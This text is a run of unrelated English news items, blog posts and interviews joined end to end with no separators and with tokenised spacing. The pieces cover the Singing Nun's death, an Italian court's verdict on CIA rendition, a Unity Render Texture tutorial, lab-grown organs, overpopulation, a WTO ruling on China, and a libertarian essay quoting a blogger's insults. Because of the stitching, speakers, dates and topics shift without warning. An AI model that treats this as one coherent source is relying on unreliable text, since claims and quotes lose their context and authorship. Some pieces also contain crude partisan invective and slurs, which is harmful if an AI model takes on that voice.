She reluctantly agreed .
Soon after that followed a recording contract , an appearance on the Ed Sullivan Show , and finally a biopic , “ The Singing Nun , ” ( later described by Deckers as “ fiction ” ) starring Debbie Reynolds .
Deckers signed over any profits to the convent .
Disillusioned with the authoritarianism of the church , she left in 1967 to pursue a solo singing career .
She recorded an album , which included “ Glory Be to God for the Golden Pill ” praising benefits of the birth control pill for women .
The comeback was a flop .
Also , in 1967 , she moved in with Annie Pécher , a childhood friend ( who may have also been her lover ) .
The two founded a school for autistic children .
At this point , the Belgian government tragically entered the scene .
Using a dubious loophole in a contract she signed with the church ( which had reaped all the profits from “ Dominique ” ) , it said she owned it between $ 50,000 and $ 80,000 of back taxes .
The government was unrelenting in pressing its claim .
Depressed and weighed down by debt , Deckers resumed her singing career in a last ditch attempt to pay the taxes and raise enough to keep the school open .
As part of the comeback , she recorded a promotional video featuring a disco version of “ Dominique . ”
See it here .
Her timing was terrible .
Disco was on life - support in 1982 and it was another flop .
The school closed .
With no way left to pay the government , Deckers and Pécher committed suicide together .
Pécher left this note : “ We do suffer really too much ...
We have no more place in life , no ideal except God , but we can't eat that .
We go to eternity in peace .
We trust God will forgive us .
He saw us both suffer and he wo n't let us down . ”
ROME , Italy ( CNN ) --
Nearly two dozen Americans -- most thought to work for the CIA -- were sentenced to five years in prison Wednesday by an Italian court for their role in the seizing of a suspected terrorist in Italy in 2003 , the prosecutor in the case told CNN .
The Americans did not appear for trial and are not in custody , but the ruling could effectively make them international fugitives .
The trial was the first to deal with a practice that human rights groups call " extraordinary rendition . "
They say the United States has often sent suspects to countries that practice torture .
Washington acknowledges making secret " rendition " transfers of terrorism suspects between countries but denies using torture or handing suspects over to countries that do .
The case centered on the extraordinary rendition of a Muslim cleric , Osama Mustafa Hassan Nasr , or Abu Omar .
He was seized on the streets of Milan , Italy , in 2003 , transferred to Egypt and tortured , he said .
He was suspected of recruiting men to fight in Iraq and Afghanistan and was under heavy surveillance by Italy 's intelligence agency .
Prosecutors said he was nabbed by a CIA team working with Italian intelligence officials .
The verdict " shows governments and institutions that the fight against terrorism has to be carried out in accordance with the law .
There are no shortcuts , " Spataro told CNN .
Those who were found guilty were ordered to pay Abu Omar 1 million euros ( $ 1.48 million ) and his wife 500,000 euros .
A total of 22 Americans were each sentenced to five years in prison for their role in his abduction .
Another -- Robert Seldon Lady , whom prosecutors said was the CIA station chief in Milan -- was sentenced to eight years in jail , prosecutor Armando Spataro told CNN .
Cases were dismissed against three other Americans , including Jeff Castelli , the man assumed to be the CIA station chief in Rome at the time , because they had diplomatic immunity from prosecution .
Spataro said he may appeal that ruling .
Cases were also dismissed against the former head of Italy 's intelligence service and his deputy because of state secrecy provisions .
Two other Italians were sentenced to three years in jail for aiding the plot .
Sabrina De Sousa , one of the American defendants , was " saddened , angered and dismayed " by the ruling , her lawyer told CNN .
She felt the U.S. government had " stabbed her in the back , " Mark Zaid said .
" We understand why the Italians did what they did .
They were following their laws .
But at the end of the day , representatives of our United States government abroad were let down and left alone by their own government . "
De Sousa , a career diplomat , is suing the State Department over the case , Zaid confirmed .
She has never said she worked for the CIA .
CIA spokesman George Little said Wednesday : " The CIA has not commented on any of the allegations surrounding Abu Omar . "
But U.S. officials confirmed to CNN when the case first broke that the CIA was involved in the rendition of Abu Omar from Italy to Egypt .
The officials never disclosed the number of Americans involved or their names .
Pentagon spokesman Geoff Morrell responded to the verdict as it applied to an Air Force officer , Lt. Col.
Joseph Romano III , who was among the Americans sentenced .
The Pentagon had asserted jurisdiction over the incident under the NATO Status of Forces Agreement , a position that the Italian minister of justice supported , Morrell said .
" We are clearly disappointed by the court 's ruling , " Morrell said .
" Our view is that the Italian court has no jurisdiction over Lt. Col .
Romano and should have immediately dismissed the charges . "
The American Civil Liberties Union , a persistent critic of Washington 's extraordinary rendition program , demanded the United States match Italy 's actions .
" The decision in Italy underscores the need for the United States to hold its own officials accountable for crimes committed under the ' extraordinary rendition ' program .
It is shameful that the first convictions of this kind came from a foreign justice system , where those convicted are not likely to serve their time , " said Steven Watt , staff attorney for the ACLU Human Rights Program .
Italian authorities originally indicted 26 Americans and five Italians in 2007 for kidnapping in the matter .
The Italians included the former head of Italian intelligence , Nicolo Pollari , and one of his deputies .
They testified in preliminary hearings that Italian intelligence played no role in the alleged abduction .
None of the Americans is in custody in Italy and the Italian government did not ask for their extradition ; they were tried in absentia .
Former CIA analyst Michael Scheuer told CNN in the past that the Italian military secret service had approved the operation involving Hassan , and CIA sources who refused to be named told CNN in 2005 that the agency had briefed and sought approval from its Italian counterpart for such an abduction .
The Italian government of the day -- which was led by Silvio Berlusconi -- vigorously denied having authorized Hassan 's kidnapping , which it called illegal .
Berlusconi has since returned to power .
CNN 's Hada Messia in Rome ; Paula Newton in London , England ; and Pam Benson and Jim Barnett in Washington contributed to this report .
I ’ve been working with Unity for a while now so this article was long overdue .
Initial I was planning on doing some entry level stuff , like what is a Rigidbody , adding materials , etc .
As more and more good video tutorials began appearing online I decided that I would do something a little more advanced than that .
Do n’t worry it not much more advanced .
I recently purchasing Unity Pro and have been digging into some Pro only features .
One of my favorites so far is Render Textures .
Render Textures simply put allows you to render the output of a camera to a texture .
More detail on Render Textures can be found here
For this example I modeled a TV in Blender ( do n’t laugh at the model it is my first ) with an empty space for where the screen would be .
Steps in Creating a Working TV That Displays What You See .
Add basic environment objects ( ground , skybox , First Person Controller , lights etc ) Import a tv model into Unity and place it within the scene Create a plane within Unity and position it within the TV model to be used as the TV screen ( using Render Texture with planes is easiest ) .
Right click within the Project panel to create a ‘ Render Texture ’
Add a second camera as a child to the ‘ Main Camera ’ within the First Person Controller .
Set the ‘ Target Texture ’ property of this camera to the newly created Render Texture .
Add this texture to a material Add this material to the tv screen
Hit play and you should have a working TV
Hints and Gotchas :
You will need to rotate the render camera 180 degrees on its z- axis so that it will render the scene the right way up Update : Incorrect , looks like I had my rotations messed up .
If the plane you are rendering to is rotated correct the render material will appear the right way up .
Update : Incorrect , looks like I had my rotations messed up .
If the plane you are rendering to is rotated correct the render material will appear the right way up .
You will need to use at a least two cameras when using Render Texture because the camera that is rendering to screen can not also render to a texture
If you have added a Skybox to your main camera you will need to add this Skybox to the render camera(s ) .
If you have multiple cameras it may be easier to set the Skybox material within Render Settings instead of setting each camera ’s skybox individually .

Source Requirements :
You will need need Unity Pro to use the Render Texture feature .
Update : I have released an update version of this demo that includes object interaction .

At TEDMED , I witnessed video clips showing science I never knew was so advanced .
Dr. Anthony Atala has been growing human tissue and organs , in a lab , for nearly two decades .
He 's even printed kidneys from a cell - stuffed inkjet printer .

The footage below is from the Wake Forest Institute for Regenerative Medicine , one of the world 's largest labs dedicated to regenerative medicine — a field interested in repairing or replacing human tissue so the body can self - heal .
This collection is sort of a greatest hits of Dr. Atala 's last 20 years of research ( no , none of this was done overnight on a whim ) , though almost none of what you 'll see has left the lab for clinical trials .
Karen Richardson , Sr. Communications
Manager at the lab , walks us through the videos in the gallery below .
Watch the clips , then scroll down for our Q&A with mad ( but completely sane ) scientist Dr. Anthony Atala .

Interview With Dr. Atala
What can we do in organ growing / generation today ?
Laboratory - grown organs and tissues are already benefiting patients today .
For example , laboratory - grown bladders are being tested in children with spina bifida and adults with spinal cord injuries and will soon be tested in patients with bladder cancer .
Tissue engineering technology has been used to repair narrowed urethras , the tube that empties urine from the body .

What will we be doing in 5 years ?
We are currently working to engineer 22 different tissues and organs in the laboratory , including blood vessels , heart valves , bone , muscle , kidneys livers .
Scientific progress is n't always linear , so it 's impossible to predict how long it will take to reach our goals .

In 10 ?
In addition to tissue engineering , our lab and others are working toward cell therapies to benefit a variety of conditions , from diabetes to urinary incontinence and heart failure .
There are many challenges to overcome — and the timeframe is impossible to predict — but we do see promise in these technologies .

In 20 ?
( I know , totally nuts , but that 's what makes it so fun . )
I do n't know how long it will take , but I do foresee a future when organs will be available off - the - shelf , ready to " plug in " and replace injured or diseased organs .
I believe we 'll have a boutique of technologies that will includes tissue engineering and cell therapies and doctors will select the ideal treatment based on the patient 's needs .

This week , Gizmodo is exploring the enhanced human future in a segment we call This Cyborg Life .
It 's about what happens when we treat our body less as a sacred object and more as what it is : Nature 's ultimate machine .
If you are feeling brave , take a look at the World Clock .
You ’ll see that more than twice as many people are being born as are dying for any given interval ( click the “ Now ” button to see the numbers spinning out from the present ) .
Click the “ Deaths ” tab and note that for every 100 deaths , there are also more than 60 abortions , and yet the Earth ’s population still spirals out of control .
Click around on the other tabs and you will probably find yourself transfixed by magnitude of these numbers .
Notice the vast amount of forest being decimated by clicking on the “ Environment ” tab .
Under the “ Energy ” tab , notice the incredibly disconcerting “ Oil Depletion Timer , ” indicating that we have 40 years of oil left on the entire planet ( you ’ll need to do the math , dividing the days left by 365 – this estimate is based on the admittedly laughable assumption that it would be economically viable to scoop up every drop of oil ) .
Notice the ghastly numbers of entire species being lost each week ( almost 300 extinctions per week ) .
Notice the many thousands of preventable deaths every week ( under the Death tab ) , including ghastly numbers of children dying from preventable things like lack of nutrition .
The World Clock sends me into an existential swirl .
Watching these numbers accumulate fascinates me and , regarding some categories , horrifies me .
Regarding the needless deaths , for example , it occurs to me that no human being has sufficient cognitive capacity or sufficient empathy to properly understand or react to numbers of this magnitude .
It is impossible to feel sufficient empathy for the needless deaths of thousands people , week after week .
Last year , I posted on an effort by Global Population Speak Out ( GPSO ) to discuss the need to discuss overpopulation .
But many people are too horrified to even consider this topic .
One such person repeatedly vilified me in the comments , arguing that I was an elitist ( and worse ) because I merely dared to raise this issue .
But this issue of overpopulation is too important to ignore .
The bottom line issue is this :
In terms of human animals , what is the carrying capacity of the Earth ?
Thoughtful people immediately recognize that this question inevitably dovetails with the issue of quality of life .
For instance , if we ’re willing to settle for a degraded standard of living in the U.S. , we could add three billion more people to the U.S. and live a desperate disease - ridden scorched - earth existence .
That is what you would expect , of course , unless you were one of those people who plans on multiple new scientific revolutions ( including a massive new green revolution ) that will save the day , allowing us to pack even more people onto the planet .
In my mind , though , rational people do n’t plan on miraculous good things .
Yes , they are hopeful that some good things will happen , but rational people have the courage to acknowledge the clear evidence of our highly stressed resources and they make their plans based on these limitations and dangers .
As I mentioned at the top , overpopulation is an issue that makes many people go ballistic .
They ridicule those who even raise this issue at all , accusing them of things that they are making up in their heads .
These accusers do n’t want the issue discussed at all–they want to pretend that the degradation of our environment and our dwindling natural resources have nothing to do with the the fact that we are adding people to Planet Earth at a ferocious clip .
Based upon numerous articles I ’ve referenced at this website over the years ( regarding energy , food , water , soil ) , this issue of overpopulation desperately needs to be discussed .
It should even be the headline story on a regular basis .
Every time a news source reports on an oil war , or climate change , or food shortages , there should be an asterisk reminding the reader that this issue has been exacerbated by overpopulation .
Overpopulation is rarely raised by news publishers , however .
They dare not raise it starkly , for the reasons sketched above .
GPSO has recently announced its GPSO 2010 .
Here is the idea in a nutshell :
The idea of Global Population Speak Out ( GPSO ) is that those of us who care about this issue need to discuss the issue publicly , and that the best way to do this is to speak out together .
Here is the position of GPSO :
The size and growth of the human population are fundamental drivers of the ecological crisis we face — no less crucial than emissions , over - consumption in developed nations , habitat loss and toxic pollutants .
If we hope to avert worldwide catastrophe , many experts agree , we ’ll need to continue working strenuously on those issues but also conduct a massive shift of attention and resources toward humane , progressive measures designed to stabilize and ultimately reduce world population to a sustainable level .
Yet there exists today a taboo of sorts against public discussion of overpopulation .
Outside the scientific community , calls to address overpopulation often meet vigorous , ill - informed criticism and blatant hostility from both the left and right .
Most of these sorts of objections are either obstinately ideological or stem from financial interests dependent on population growth for profit .
There are also well - known historical instances of shockingly coercive , involuntary birth control measures being implemented by misguided state policy .
Understandably , few in a position to speak out on the population topic care to do so under such conditions .
Change does not spring from silence , however .
We must find a way to break down the taboo and bring the population issue — which is absolutely fundamental to sustainability — back to the center of public discussion .
Over the decades , writers such as Paul Ehrlich have sounded the alarm , arguing that we are headed for a disaster .
Ehrlich ’s estimates turned out to be overly - pessimistic and he was vilified by many people , including many people who refuse to face up to the dangers of failing to address overpopulation .
All indications are , however , that only Erlich ’s time line was inaccurate , and that we human inhabitants of earth truly are in a desperate situation that is being exponentially compounded by our sheer numbers .
It is again time to raise this critically important topic .
Until we frankly acknowledge the fact of overpopulation , we will be unable to discuss potential solutions to the problem ( one potential solution involves focusing on the resource - hog lifestyles of many developed countries ) .
It is not presumed by anyone I know that the solution involves casting most of the blame on third - world populations .
We are all part of the situation and we can all contribute to solutions .
Earth is a big blue Lifeboat spinning through space .
Imagine a real life lifeboat holding 50 people , and eking out subsistence for its occupants thanks to occasional rainfalls and through modest success in fishing .
Imagine that the no rescuer appears , however , and that over a period of years , many of the occupants of the lifeboat start having babies .
Image that this boat was designed to hold 50 but that it is now carrying 75 people , and that the meagre resources are being stretched to the breaking point .
Imagine , further , that no one on the boat wants to raise the topic of the carrying capacity of the lifeboat .
Imagine that they wo n’t raise the topic because when they tried to do so in the past they were shouted down and told to shut up .
Would that be a smart way to run any sort of lifeboat ?
The World Trade Organization has ruled that China 's practice of funneling media imports to state - owned companies — which facilitates the country 's long tradition of censorship — violates international trade laws .
The ruling was a result of complaints filed by a number of US media companies , which contend that China 's practices illegally restrict business opportunities .
The WTO said that China cannot limit distribution of movies , music , books , and other media to government - controlled companies .
The ruling does not restrict China from reviewing materials for " objectionable content , " but asserted that such restrictions were not necessary for the protection of public morals ( one of the few possible exemptions a country can claim for limiting trade ) .
China 's Commerce Ministry expressed " regret " over the WTO 's rulings .
The complaint was brought by the US , based on complaints from a who 's who of big content : EMI , Sony Music Entertainment , McGraw Hill , Simon & Schuster , Warner Bros , Disney , Paramount , Universal , and 20th Century Fox .
These companies contend that the effective limits on imports of US media represent a loss on millions of dollars in potential business .
The restriction against selling directly to Chinese consumers is also cited as the main reason there is no official Chinese iTunes Store , despite the popularity of iPods and iPhones in the country .
Chinese consumers often bought from the US iTunes Store using credit cards issued by a US bank as a workaround , but China cut off access to the US iTunes Store last year because of a pro-Tibet album that was popularized during the Olympics .
Access was later restored after the album was blocked for Chinese users .
The WTO has given China one year to get its act together and bring its import policies in line with international trade laws .
If not , the US can ask the WTO to bring commercial sanctions against China .
A similar tactic was proposed as a way to effectively break down China 's infamous " Great Firewall , " which routinely blocks access to Wikipedia , Twitter , blogs , and other websites .
Though the current WTO ruling does n't address access to websites and web - based services specifically , it serves as a precedent that such a complaint could prove successful .
Joe Lieberman may have got his way and gutted the healthcare reforms .
But everyone hates the smug ( redacted ) with his smug ( redacted ) face — and even the Times can't resist mentioning it .
The opening line of today 's story — in which Lieberman comes off as a bigger cuntbag than he 's ever managed to before ( which is no mean feat ) sets the tone :
Just the thought of Joseph I. Lieberman makes some Democrats want to spit nails these days .
The article goes on to elaborate on Lieberman 's feelings at this difficult time .
Is he agonized ?
Surely the thought of denying healthcare to millions over some abstract notion of future debt is giving him pause ?
Mr. Lieberman could not be happier .
He is right where he wants to be - at the center of the political aisle , the center of the Democrats ' efforts to win 60 votes for their sweeping health care legislation .
For the moment , he is at the center of everything - and he loves it .
" My wife said to me , ‘ Why do you always end up being the point person here ? ' " he said , flashing a broad grin in an interview on Monday .
Whereupon the New York Times correspondent punched him in the face .
In ideal - world .
What really happened was that he appears to have got his own way completely .
By being a dick .
There 's plenty more tooth - grinding detail here — reporting galore in fact .
But perhaps it 's worth following the example the Times say other politicians have taken , and going zen on the whole thing .
Americans love the U.S. military — and especially American conservatives .
Even among those who treasure the Constitution , oppose an interventionist foreign policy , and no longer support the war in Iraq , the U.S. military is still held in high esteem .
Support for the military among conservative Christians is just as bad — and perhaps even worse .
Many Christians have a military fetish .
Support for the military has been elevated to an article of faith by many evangelicals .
It does n’t seem to matter where U.S. troops go , why they go , how long they stay , how much it costs to keep them there , how many foreigners die at their hands , and what they do when they are there — stanch support for the military is inherent in any conservative platform , secular or religious .
Conservatives get indignant when you question the institution of the military .
To question the military in any way means that one is unpatriotic , unappreciative , and un-American .
I have written about these things many times over the years .
So then , why another article on the U.S. military ?
On Saturday , December 12 , I posted the following picture on the LRC blog with the comment : “ Hey Marines , how about some toys for this tot in Afghanistan . ”
The picture of this Afghan child was taken at the International Red Cross Orthopedic rehabilitation center on December 10 in Herat , Afghanistan .
According to the UN mine information network , an average of sixty - two people are killed or injured by mines each month in Afghanistan .
Well , the “ Conservative , Pro-military ” blogger at politicalbyline.com went ballistic .
In a post titled : “ Why I left the libertarian ranks : Exhibit A — Hatred of the United States Military , ” Patrick ( he does n’t give his last name ) , who blogs from “ the southern suburbs of Detroit , ” opines : I present this as “ Exhibit A ” , to the fact that the libertarian movement has been infiltrated by Anti-War leftists who hate America , our Military and why they should be stripped of their citizenship and deported out of our fine Country and into another country ; like say , North Korea , Venezuela or maybe even Communist China .
Not to be rude about this , but it just so happens , that if that dumb kids fellow Countrymen had not giving refuge and comfort to those who would seek to destroy America — Namely Osama Bin Laden and Al - Qaeda ; the damned kid would still possibly have his damned leg .
Not to mention the fact that on September 11 , 2001 , our Country was attacked by Islamic terrorists who did more than just destroy a leg .
It killed 2,996 of our people .
However , of course , you cannot tell this to the likes of Lew Rockwell and his bastard gang of leftists who hate this damn Country ; they still believe that George W. Bush ordered those planes into the trade center towers .
What really troubles me , is that the author of this posting is none other than Dr. Lawrence Vance , who is supposedly a Born - Again Christian .
How anyone can harbor such hatred for this Country and our Nation ’s Military and still claim to be ANY kind of a Christian is beyond me .
In an update , Patrick adds that “ libertarian leftists , their Paleo - Conservative counterparts , and their cousins the Anti-War socialist left ” are all in bed together because of their views on foreign policy and their “ inbred hatred of war and of anything military . ”
If you like this site , please help keep it going and growing .
I normally do n’t pay too much attention to gnats , and especially when they take the form of bloggers that no one has ever heard of .
My interest in this “ Conservative , Pro-military ” blogger lies solely in the fact that he is not alone .
There are millions of disciples of Limbaugh , Hannity , Beck , and O’Reilly who feel the same way he does .
I would therefore like to reply to his post , clarify some things , and make some recommendations .
In addition to the incorrect spelling of my name , there are a number of fallacies evident in the screed by Patrick the “ Conservative , Pro-military ” blogger .
First and foremost is the claim that antiwar libertarians hate the military .
I do n’t recall ever writing anywhere that I hated the military .
And neither do I remember reading where some other antiwar libertarian said that he hated the military .
I hate many things that the military does , and think I have good reasons for doing so , as I mention below .
I certainly do n’t hate any individual members of the military or any other organization .
I ca n’t speak for all antiwar libertarians , but here are some things I hate about the military :
I hate the military fighting without a constitutional congressional declaration of war .
I hate the military garrisoning the planet with bases .
I hate the military targeting impressionable high school students ( thanks to the NCLB act ) .
I hate military recruiters lying to potential recruits .
I hate the military fighting foreign wars .
I hate the military fighting unjust wars of aggression .
I hate the military invading and unleashing violence and civil unrest in Iraq and Afghanistan .
I hate the military bombing and destroying Iraq and Afghanistan .
I hate the military killing hundreds of thousands of Iraqis and Afghans .
I hate the military maintaining troops in Germany , Italy , and Japan when World War II ended in 1945 .
I hate the military stationing troops in 150 different regions of the world .
I hate the military recruiting terrorists and feeding insurgencies by its foreign occupations .
I hate military chaplains praying with troops before they unleash death and destruction .
I hate the military doing anything other than actually defending the country .
I hate the military perpetuating the myth that they are defending our freedoms when the more the troops defend our freedoms the more our freedoms are taken away .
I hate the military perpetuating the myth that I could n’t write the things I do if it were n’t for the U.S. military when the truth is I would n’t need to write the things I do if it were n’t for the actions of the U.S. military .
( To their credit , some members of the military do n’t practice these last two points .
They know they enlisted because they needed a job or wanted money for college .
They are not stupid enough to think that they are defending anyone ’s freedom to do anything .
Oftentimes , it is chickenhawks and armchair warriors who talk the loudest about the troops defending our freedoms . )
The Left , The Right an ... Llewellyn H. Rockwell Jr Best Price : $ 7.33 Buy New $ 40.00 ( as of 07:55 EST - Details )
I would love it if the functions of the U.S. military were limited to defending the United States , securing U.S. borders , guarding U.S. shores , patrolling U.S. coasts , and enforcing no - fly zones over U.S. skies instead of serving as the president ’s personal attack force to bomb , invade , occupy , and otherwise bring death and destruction to any country he deems necessary .
I would be thrilled to death if all the troops stationed overseas came home , all foreign bases were closed , and no more American soldiers died fighting foreign wars .
In addition to his statements about the military , Patrick the “ Conservative , Pro-military ” blogger is guilty of the following .
He equates the U.S. government and military with the country .
If one disapproves of the warfare state then he must hate America .
But why is it that a conservative can disapprove of the welfare state and not be considered anti-American ?
What is so sacrosanct about the military ?
He refers to Lew Rockwell and myself and other antiwar libertarians as leftists when we are anti-leftists who despise FDR and his New Deal , LBJ and his Great Society , and every other liberal program and left - wing income redistribution scheme .
He thinks that to be antiwar is to be left wing .
This is absurd .
See the article by Gary Benoit of the John Birch Society ( certainly not a leftist organization ) titled : “ Anti-war Stance Is Right , Not Left . ”
He sees everything in terms of a left / right paradigm .
I recommend that he read Murray Rothbard ’s “ Left and Right : The Prospects for Liberty ” and Lew Rockwell ’s The Left , the Right , and the State .
He refers to the anti-war socialist left like it is alive and well when the reality is that it is hardly in existence anymore since the inauguration of their leader to the presidency and his escalation of the war in Afghanistan .
He makes the ridiculous statement that we believe Bush ordered the planes into the trade center towers .
I think Bush was too stupid to know what was happening on September 11 .
And if he is subtly implying that I am a 9/11 Truther , then he is mistaken , although I do n’t believe much of what the government says about what happened on 9/11 — or any other day for that matter .
Christianity and War a ...
Laurence M. Vance Best Price : $ 3.46 Buy New $ 5.96 ( as of 12:30 EST - Details )
He wonders how anyone can be a Christian and harbor such hate for the country and its military .
Here he is ascribing things to me that are simply not true , as I explain above .
Actually , the wonder of wonders is how Christians can be so enamored with the military .
See my Christianity and War and Other Essays Against the Warfare State and my LRC article archive for the articles I have written since the publication of the book .
The most disturbing statement by Patrick the “ Conservative , Pro-military ” blogger is that antiwar libertarians should be “ stripped of their citizenship and deported out of our fine Country and into another country ; like say , North Korea , Venezuela or maybe even Communist China . ”
This exposes him as the red - state fascist that he is .
As bad as genuine leftists are , I do n’t recall any of them ever calling for conservatives or libertarians to be stripped of their citizenship and deported .
But apparently our blogger does n’t think that deportation is punishment enough .
In a note to someone in the military who wrote to him in defense of my “ Toys for Tots ” post , Patrick says : “ Pat Tillman , another Anti-War twirp [ twerp ] that got what was coming to him . ”
I took a lot of heat for this statement I made in a recent article : “ The very heart and soul of conservatism is war .
Patriotism , Americanism , and being a real conservative are now equated with support for war , torture , and militarism . ”
Patrick , the “ Conservative , Pro-military ” blogger at politicalbyline.com , is exhibit A of why this is true .

Knickerless cage is a contender for the 2009 Turnip Prize
Entries have been invited for this year 's Turnip Prize for bad art .
The award , an alternative to the Turner Prize , is presented by the residents of a Somerset village .
In what the organisers have described as " an insignificant development " pieces entitled Wallace and Vomit and Knickerless cage have been submitted .
Judging is due to take place on Monday .
A ceremony will then be held to present the prize on 7 December at The New Inn pub in Wedmore .
Raw chicken
According to the rules , there are no barriers to entry into the competition , they simply state : " You can enter anything you like , but it must be rubbish . "
Organiser Trevor Prideaux said the sculpture entitled Wallace and Vomit by Sick Puke had a good chance of claiming the prize .
" This is not art it 's just regurgitation , which gives it a good chance of winning , " said Mr Prideaux .
The entry entitled Knickerless cage by Sue She shows a collection of naked Barbie dolls encaged in wire mesh .
Previous winners of the gong include a raw chicken stuffed with leaves entitled Take a Leaf out of my Chook and sheep 's wool stuck on top of a jar entitled Fleeced .

Knew something was up with that trailer rating this morning ;
Sega just let us know that Aliens vs Predator , a violent game which had previously been refused classification in Australia , has had that ruling overturned .
Advertisement
Sega Australia 's general manager , Darren Macbeth , tells Kotaku " It is with great pleasure that we announce the success of our appeal .
We are particularly proud that the game will be released in its original entirety , with no content altered or removed whatsoever .
This is a big win for Australian gamers .
We applaud the Classification Review Board on making a decision that clearly considers the context of the game , and is in line with the modern expectations of reasonable Australians " .

The ruling means the game will now be classified MA15 + , meaning only those aged 15 years over can purchase the game .
It also means no cuts or edits will need to be made to the title in order for it be sold , which is lucky , since developers Rebellion had sworn that 's something they were n't going to do .

As I noted in an article Monday , the National Science Foundation wants to reform high school computer science education in America , expanding its reach and updating the curriculum to better prepare students for a 21st - century economy .
Professional organizations and major technology companies , including Google , Microsoft and Intel support the broad agenda , though companies are not getting into curriculum details .
There is some reason for optimism .
The Obama administration is increasing federal support for science , technology , engineering and mathematics education , or STEM programs .
But in the United States , K - 12 education is a state and local affair .
Any agenda for change will live and die at the level of school superintendents , teachers and parents .
And computer science programs , typically elective courses , have suffered in recent years because of budget cuts and the priority given to core courses that are the basis of standardized tests .
The N.S.F. seems to have a sound strategy for elevating computer science education in high schools by collectively raising its sights .
Across the board , the approach is less emphasis on the digital equivalent of shop classes — how to use PowerPoint and Excel , or do Java programming .
Instead , the goal is to “ teach them the magic of computing , ” said Janice Cuny , program director of the foundation
This represents a return to the larger ambitions of computing education decades ago .
In the early 1960s , the professors John Kemeny and Thomas Kurtz developed BASIC ( Beginner ’s All - purpose Symbolic Instruction Code ) at Dartmouth College because they thought educated people , and future leaders of America , should have some first - hand experience with computing .
They were influenced by C.P. Snow ’s “ The Two Cultures ” and the concern that the rise of computing would divide the population into two groups — those who understood the strengths and weaknesses of modern technology and those who were passively ruled by it .
In talking to education leaders , one hears echoes of that thinking .
“ Kids going through school today need to be more than mere consumers of this technology , to be functional and literate citizens , ” said Chris Stephenson , executive director of the Computer Science Teachers Association .
“ And that will be true for them no matter what they become — artists , geologists , doctors , lawyers and , yes , computer scientists . ”
A broader and smarter approach to high school courses , ideally , will produce more American computer scientists , but mostly it will enlarge the pool of people who understand and sample the field .
“ Some percentage will absolutely adore it , as in any discipline , ” said Alfred Spector , vice president for research and special initiatives at Google .
“ But the main goal is to broaden the funnel , to show more kids the extraordinary depth of this field and all you can do with it . ”
Indeed , one thing that is striking for veterans of the field is that some of the things envisioned decades ago , like artificial intelligence , machine learning and natural - language translation , are starting to move into mainstream in the Internet era .
Mr. Spector is one of those veterans .
As a student at Harvard , he built some basic programming tools for the university ’s computer center , which Bill Gates used to write his start - up company ’s first product , Microsoft BASIC .
“ Computing , ” Mr. Spector said , “ is far more interesting than when Bill Gates and I were students at Harvard . ”
Once upon a time , wandering through the forest of nonprofit blogs , I stumbled upon a blog , managed by a team based here in Rome .
Over the past years , I got to know most of the people involved , as a bunch of great individuals , driven by enthusiasm and passion about their cause : the ICT - KM team at the CGIAR – the Global Partnership for Agricultural Research .
The ICT - KM team recently revamped their blog , and merged it with their website .
The outcome was a sparkling new blog .
I wanted to know more .
Time for a talk with two of the ICT - KM members : Antonella Pastore and Enrica Porcari .
An interview which touched on many issues dear to our heart : “ What are the benefits of social media to nonprofit organisations ? ” , “ What motivates people to blog ? ” , “ Migrating a blog from one platform to another ” , “ the difference between blogs and traditional Content Management Systems ” , “ Blog traffic and the importance of good content ” …
Blogtips : CGIAR is not particularly a household name in the nonprofit sector .
What is your work all about ?
Enrica : Familiar with the Green revolution ?
With the work of Norman Borlaug ?
With the research behind vitamin A improved rice that helped prevent blindness of millions of children in developing countries …?
Well , then you know about our work , even if you may not be familiar with the acronym .
The Consultative Group on International Agricultural Research ( CGIAR ) was established in 1971 .
It is now a partnership of 64 members : countries , foundations , philanthropic organizations that support 15 international research centers spread across the globe .
Blogtips : Sounds like “ Monsanto for the Poor ”
Enrica :
We work with hundreds of governments and civil society organizations as well as private businesses around the world to carry out scientific research for sustainable agricultural growth so that the poor can have access to more and better food .
Each center has a specific mandate .
Many research on crops , such as potatoes , rice , wheat , .. while others work on water , livestock , fishery .
We basically cover the whole array of a food basket , and do policy work as well .
Our work is for a nonprofit cause : all of our research , our findings , are put in the public domain , they are free for anybody to access .
Our mission is to enhance the lives of poor in developing countries .
For example we do research to improve the production or the nutritional value of crops , commodities we refer to as the ‘ neglected ’ crops .
These are areas the giants , such as Monsanto , may not be interested in , as they are of little commercial interest in the countries of the north .
However , this forms the basis for the well - being of many families in the developing countries .
It is for them we work .
Blogtips : Aha ..
Now , your team “ ICT - KM ” is not doing actual agricultural research , right ?
How do you guys fit into all of this ?
Enrica :
Our 15 research centers are autonomous entities , and at the central level , there are a number of so - called “ System Units ” that work with and for the Centers in specific functional areas .
Ours , the ICT - KM Program , is one of them .
We promote and support the use of innovative ICT tools and knowledge management practices to improve the effectiveness of the CGIAR System .
If you consider the CGIAR employs almost 8,000 people working in over 200 locations , many very remote , this is not a small feat .
Our team is distributed among many centers , some of us are at Bioversity International , near Rome , others at CIAT Colombia , at WorldFish Malaysia , and we are growing …
At the moment , we work in three broad areas : support and development of research project information systems , technical support and coaching in the use of online collaboration tools that we identify for the broader CG community , coordination of cost saving agreements on IT and software licensing .
Blogtips :
And social media like Twitter , blogs , Flickr are some of these tools ?
Antonella :
That ’s right !
This is where our blog comes in .
Blogtips :
How did you guys start blogging ?
Antonella :
The blog started in the summer of 2007 .
It was an initiative of the two knowledge sharing project coordinators , Simone Staiger - Rivas and Nadia Manning .
They initiated it as a way of ‘ walking the talk ’ :
We always advocated improved , more effective sharing of information , the involvements of our partners , and transparency .
While these are all tenets of the work the research centers carry out , we wanted to apply these principles also to our team ’s work .
We used to have a regular email newsletter to keep people informed of our activities , we kicked off our blog mainly as a way to document the meetings , our own initiatives , the pilot projects spread over different locations .
Pretty soon , the blog proved to be a much more efficient and timely way to communicate .
Blogtips :
And it replaced the newsletter ?
Antonella :
No , the two still exist today .
Over time the blog has become the main place to publish project updates from the project , trainings and meetings we attend .
We also used it for tutorials and guides on the tools we support .
The newsletter is a short summary of these , pointing to articles we publish on the blog .
So the two became complementary .
Blogtips :
Two years ago , “ Taraaa… a blog .. ” !
Enrica :
As all new blogs with a niche audience , it started slowly , back then in 2007 .
But from the start , the traffic and content kept growing .
A year later was a turning point .
I called a team meeting and we decided it was time to “ get really serious about blogging ” .
Every team member was going to blog !
More people got involved ..
Antonella : …we even got ‘ guest bloggers ’!
Enrica : Gradually , we all became more confident and familiar with the medium .
The content was extended with “ live blogging ” from events , opinion pieces , tutorials and guides .
Antonella :
And this is where we are today : a mix of time - sensitive content and more “ stable ” pieces .
Blogtips :
As the content was extended , did you reach more people ?
Antonella :
Oh yes !
